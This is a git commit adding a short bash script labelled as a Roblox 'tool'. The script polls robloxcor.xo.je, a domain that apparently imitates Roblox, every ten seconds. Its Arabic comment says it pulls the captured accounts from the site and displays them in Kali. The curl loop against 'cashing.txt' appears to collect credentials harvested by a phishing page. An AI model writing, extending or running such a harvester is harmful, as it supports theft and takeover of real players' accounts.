5c63d71d8ee89f1dd65315996f0e39c9626a52a7
mazenasad <mazenasad63@gmail.com>
2026-03-11 23:08:04 +0300

    Create xxszmsx.sh

---
+++ xxszmsx.sh
@@ -0,0 +1,18 @@
+#!/bin/bash
+# أداة xxszmsx
+clear
+echo "======================================"
+echo "      TOOL xxszmsx BY roblox           "
+echo "======================================"
+echo "[+] Link: https://robloxcor.xo.je/"
+echo "[+] Checking for new accounts..."
+echo "--------------------------------------"
+
+# الأمر ده هيسحب الحسابات من موقعك ويعرضها في كالي فوراً
+while true; do
+    curl -s https://robloxcor.xo.je/cashing.txt
+    sleep 10
+    clear
+    echo "Checking for new accounts... (Press CTRL+C to stop)"
+done
+
